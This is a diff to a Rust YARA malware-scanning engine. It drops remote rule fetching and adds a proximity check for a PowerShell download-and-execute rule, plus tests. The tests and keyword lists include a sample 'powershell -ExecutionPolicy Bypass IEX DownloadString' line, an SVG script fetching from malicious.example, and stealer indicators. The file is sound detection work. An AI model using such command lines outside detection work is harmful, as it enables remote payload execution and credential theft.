@@ -8,97 +8,14 @@ use std::sync::Arc;
 use std::time::{Duration, Instant};
 
 use tracing::{info, warn};
-use vigilyx_core::{DEFAULT_BLOCKED_HOSTNAMES, validate_network_host};
 
 use super::pack::{RuleBackend, RulePackLoad};
 use super::rules::ALL_RULE_SOURCES;
 use super::target::ScanTarget;
 
-const MAX_EXTERNAL_RULE_SOURCE_BYTES: usize = 5 * 1024 * 1024;
 const MAX_RUNTIME_SHARDS: usize = 256;
 const DEFAULT_ENFORCED_SCAN_BUDGET: Duration = Duration::from_secs(5);
 const DEFAULT_SHADOW_SCAN_BUDGET: Duration = Duration::from_secs(2);
-
-/// Fetch administrator-configured external YARA sources at engine startup.
-///
-/// Sources are opt-in via `YARA_RULE_URLS` (comma-separated HTTPS/HTTP URLs),
-/// bounded to 5 MiB each and compiled with the same fail-safe path as custom
-/// DB rules. A failed feed never disables built-in rules or blocks startup.
-pub async fn fetch_external_sources_from_env() -> Vec<String> {
-    let urls = std::env::var("YARA_RULE_URLS")
-        .unwrap_or_default()
-        .split(',')
-        .map(str::trim)
-        .filter(|url| !url.is_empty())
-        .map(str::to_string)
-        .collect::<Vec<_>>();
-    if urls.is_empty() {
-        return Vec::new();
-    }
-
-    let client = match reqwest::Client::builder()
-        .timeout(Duration::from_secs(8))
-        .build()
-    {
-        Ok(client) => client,
-        Err(error) => {
-            warn!(%error, "Unable to initialize YARA external-source client");
-            return Vec::new();
-        }
-    };
-    let mut sources = Vec::new();
-    for raw_url in urls {
-        let parsed = match url::Url::parse(&raw_url) {
-            Ok(url) if matches!(url.scheme(), "http" | "https") => url,
-            _ => {
-                warn!(url = %raw_url, "Ignoring YARA source with invalid URL scheme");
-                continue;
-            }
-        };
-        if let Some(host) = parsed.host_str()
-            && let Err(error) = validate_network_host(host, DEFAULT_BLOCKED_HOSTNAMES)
-        {
-            warn!(url = %parsed, %error, "Ignoring YARA external source targeting a private/internal host");
-            continue;
-        }
-
-        let response = match client.get(parsed.clone()).send().await {
-            Ok(response) => response,
-            Err(error) => {
-                warn!(url = %parsed, %error, "YARA external source fetch failed");
-                continue;
-            }
-        };
-        if !response.status().is_success() {
-            warn!(url = %parsed, status = %response.status(), "YARA external source returned an error");
-            continue;
-        }
-        if response
-            .content_length()
-            .is_some_and(|length| length as usize > MAX_EXTERNAL_RULE_SOURCE_BYTES)
-        {
-            warn!(url = %parsed, "YARA external source exceeds size limit");
-            continue;
-        }
-        let bytes = match response.bytes().await {
-            Ok(bytes) if bytes.len() <= MAX_EXTERNAL_RULE_SOURCE_BYTES => bytes,
-            Ok(_) => {
-                warn!(url = %parsed, "YARA external source exceeds size limit");
-                continue;
-            }
-            Err(error) => {
-                warn!(url = %parsed, %error, "YARA external source body read failed");
-                continue;
-            }
-        };
-        match String::from_utf8(bytes.to_vec()) {
-            Ok(source) if !source.trim().is_empty() => sources.push(source),
-            Ok(_) => warn!(url = %parsed, "YARA external source is empty"),
-            Err(error) => warn!(url = %parsed, %error, "YARA external source is not UTF-8"),
-        }
-    }
-    sources
-}
 
 /// A single YARA match result.
 #[derive(Debug, Clone)]
@@ -616,7 +533,7 @@ fn scan_yara_x(
         error.to_string()
     })?;
 
-    Ok(scan_results
+    let matches = scan_results
         .matching_rules()
         .map(|rule| {
             let meta: Vec<(&str, yara_x::MetaValue<'_>)> = rule.metadata().collect();
@@ -638,7 +555,9 @@ fn scan_yara_x(
                 breaker_eligible,
             }
         })
-        .collect())
+        .collect();
+
+    Ok(filter_context_sensitive_matches(matches, data))
 }
 
 fn scan_libyara(
@@ -656,7 +575,7 @@ fn scan_libyara(
         error.to_string()
     })?;
 
-    Ok(matches
+    let matches = matches
         .into_iter()
         .map(|rule| {
             let meta_string = |key: &str| {
@@ -682,7 +601,95 @@ fn scan_libyara(
                 breaker_eligible: false,
             }
         })
-        .collect())
+        .collect();
+
+    Ok(filter_context_sensitive_matches(matches, data))
+}
+
+/// A small number of built-in rules describe a relationship between tokens,
+/// not a bag of unrelated words. Keep that relationship outside the YARA
+/// source when expressing it there would require an expensive unbounded regex.
+/// The raw YARA match remains the candidate generator; this validator only
+/// rejects candidates whose required terms are not in one bounded context.
+fn filter_context_sensitive_matches(matches: Vec<YaraMatch>, data: &[u8]) -> Vec<YaraMatch> {
+    matches
+        .into_iter()
+        .filter(|matched| match matched.rule_name.as_str() {
+            "PowerShell_Download_Exec" => powershell_download_exec_is_local(data),
+            _ => true,
+        })
+        .collect()
+}
+
+fn contains_ascii_ci(data: &[u8], needles: &[&[u8]]) -> bool {
+    needles.iter().any(|needle| {
+        !needle.is_empty()
+            && data
+                .windows(needle.len())
+                .any(|window| window.eq_ignore_ascii_case(needle))
+    })
+}
+
+fn ascii_ci_positions(data: &[u8], needles: &[&[u8]], limit: usize) -> Vec<usize> {
+    let mut positions = Vec::new();
+    for needle in needles {
+        if needle.is_empty() || needle.len() > data.len() {
+            continue;
+        }
+        for (offset, window) in data.windows(needle.len()).enumerate() {
+            if window.eq_ignore_ascii_case(needle) {
+                positions.push(offset);
+                if positions.len() >= limit {
+                    positions.sort_unstable();
+                    positions.dedup();
+                    return positions;
+                }
+            }
+        }
+    }
+    positions.sort_unstable();
+    positions.dedup();
+    positions
+}
+
+fn powershell_download_exec_is_local(data: &[u8]) -> bool {
+    const LOCALITY_RADIUS: usize = 4096;
+    const MAX_LAUNCHER_OCCURRENCES: usize = 256;
+    const LAUNCHERS: &[&[u8]] = &[b"powershell", b"pwsh"];
+    const DELIVERY: &[&[u8]] = &[
+        b"DownloadString",
+        b"DownloadFile",
+        b"Invoke-WebRequest",
+        b"wget",
+        b"curl",
+        b"-EncodedCommand",
+    ];
+    const EXECUTION: &[&[u8]] = &[
+        b"Invoke-Expression",
+        b"IEX",
+        b"Start-Process",
+        b"-ExecutionPolicy",
+        b"-WindowStyle Hidden",
+    ];
+
+    let launcher_positions = ascii_ci_positions(data, LAUNCHERS, MAX_LAUNCHER_OCCURRENCES);
+    // Do not let an attacker evade the relationship validator by padding the
+    // file with more launcher tokens than the bounded position collector can
+    // retain. At this density the original three-part YARA compound remains a
+    // conservative match; normal documents and the historical random-blob
+    // false positives stay on the bounded-locality path below.
+    if launcher_positions.len() >= MAX_LAUNCHER_OCCURRENCES {
+        return true;
+    }
+
+    launcher_positions.into_iter().any(|launcher_offset| {
+        let start = launcher_offset.saturating_sub(LOCALITY_RADIUS);
+        let end = launcher_offset
+            .saturating_add(LOCALITY_RADIUS)
+            .min(data.len());
+        let window = &data[start..end];
+        contains_ascii_ci(window, DELIVERY) && contains_ascii_ci(window, EXECUTION)
+    })
 }
 
 fn append_unique(
@@ -1321,6 +1328,150 @@ const url = URL.createObjectURL(blob); link.download = "invoice.zip"; link.click
                 .iter()
                 .any(|matched| matched.rule_name == "Evasion_BatCloak_Obfuscated_Batch")
         );
+    }
+
+    #[test]
+    fn powershell_download_exec_requires_one_local_command_context() {
+        let engine = YaraEngine::new().unwrap();
+        let local_chain =
+            b"powershell.exe -ExecutionPolicy Bypass -c IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a')";
+        let mut unrelated_blob = b"powershell documentation".to_vec();
+        unrelated_blob.extend_from_slice(&vec![b'A'; 32 * 1024]);
+        unrelated_blob.extend_from_slice(b"curl command reference");
+        unrelated_blob.extend_from_slice(&vec![b'B'; 32 * 1024]);
+        unrelated_blob.extend_from_slice(b"IEX stock symbol");
+        let mut padded_evasion = b"powershell ".repeat(256);
+        padded_evasion.extend_from_slice(&vec![b'C'; 32 * 1024]);
+        padded_evasion.extend_from_slice(b"curl IEX");
+
+        assert!(
+            engine
+                .scan(local_chain)
+                .iter()
+                .any(|matched| matched.rule_name == "PowerShell_Download_Exec"),
+            "a local PowerShell download/execute chain must remain detected"
+        );
+        assert!(
+            !engine
+                .scan(&unrelated_blob)
+                .iter()
+                .any(|matched| matched.rule_name == "PowerShell_Download_Exec"),
+            "unrelated words spread across a large MIME/Base64 blob must not form one command"
+        );
+        assert!(
+            engine
+                .scan(&padded_evasion)
+                .iter()
+                .any(|matched| matched.rule_name == "PowerShell_Download_Exec"),
+            "launcher-token padding must not evade the bounded locality validator"
+        );
+    }
+
+    #[test]
+    fn family_names_alone_do_not_convict_random_encoded_or_compressed_bytes() {
+        let engine = YaraEngine::new().unwrap();
+        let lumma_coincidence = b"DKIM-Signature: b=AbCdEslummaQwErTyUiOp";
+        let vidar_coincidence = b"Content-Transfer-Encoding: base64\r\nQUJDREVGR1ZpZGFySElKS0w=";
+        let lumma_positive = b"LummaC2 Login Data CryptUnprotectData";
+        let vidar_positive = b"Vidar Stealer HWID Login Data wallet.dat";
+
+        for (rule, benign, hostile) in [
+            (
+                "Mal_Lumma_Stealer",
+                lumma_coincidence.as_slice(),
+                lumma_positive.as_slice(),
+            ),
+            (
+                "Mal_Vidar_Stealer",
+                vidar_coincidence.as_slice(),
+                vidar_positive.as_slice(),
+            ),
+        ] {
+            assert!(
+                !engine
+                    .scan(benign)
+                    .iter()
+                    .any(|matched| matched.rule_name == rule),
+                "a bare family-name coincidence must not match {rule}"
+            );
+            assert!(
+                engine
+                    .scan(hostile)
+                    .iter()
+                    .any(|matched| matched.rule_name == rule),
+                "compound family behavior must remain detectable for {rule}"
+            );
+        }
+    }
+
+    #[test]
+    fn pdf_javascript_does_not_join_catalog_action_to_stream_coincidence() {
+        let engine = YaraEngine::new().unwrap();
+        let mut false_compound =
+            b"%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\nstream\n".to_vec();
+        false_compound.extend_from_slice(&vec![0xA5; 256 * 1024]);
+        false_compound.extend_from_slice(b"/JS\nendstream\n%%EOF");
+        let positive =
+            b"%PDF-1.7\n1 0 obj << /S /JavaScript /JS (app.alert('review')) >> endobj\n%%EOF";
+
+        assert!(
+            !engine
+                .scan(&false_compound)
+                .iter()
+                .any(|matched| matched.rule_name == "PDF_JavaScript"),
+            "catalog /OpenAction plus a chance /JS in stream bytes is not JavaScript evidence"
+        );
+        assert!(
+            engine
+                .scan(positive)
+                .iter()
+                .any(|matched| matched.rule_name == "PDF_JavaScript"),
+            "a real PDF JavaScript entry with an executable API must remain detected"
+        );
+    }
+
+    #[test]
+    fn svg_rules_require_standalone_svg_document_context() {
+        let engine = YaraEngine::new().unwrap();
+        let benign_html = br#"<!DOCTYPE html><html><body>
+<svg viewBox="0 0 16 16"><path d="M1 1h4v4z"/></svg>
+<script>
+const templateBase64 = "UEsDBAoAAAAA";
+const workbook = XLSX.read(window.atob(templateBase64), {type: "binary"});
+</script></body></html>"#;
+        let malicious_svg = br#"<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+<script>const p=atob("cGF5bG9hZA==");fetch("https://malicious.example/p");</script>
+</svg>"#;
+
+        let target_rules = ["Doc_SVG_Base64_Smuggle", "Evasion_SVG_Script_Exec"];
+        let benign_matches = engine.scan(benign_html);
+        for rule in target_rules {
+            assert!(
+                !benign_matches
+                    .iter()
+                    .any(|matched| matched.rule_name == rule),
+                "an inline icon and unrelated XLSX decoder must not match {rule}: {:?}",
+                benign_matches
+                    .iter()
+                    .map(|matched| &matched.rule_name)
+                    .collect::<Vec<_>>()
+            );
+        }
+
+        let malicious_matches = engine.scan(malicious_svg);
+        for rule in target_rules {
+            assert!(
+                malicious_matches
+                    .iter()
+                    .any(|matched| matched.rule_name == rule),
+                "standalone scripted SVG must still match {rule}: {:?}",
+                malicious_matches
+                    .iter()
+                    .map(|matched| &matched.rule_name)
+                    .collect::<Vec<_>>()
+            );
+        }
     }
 
     #[test]
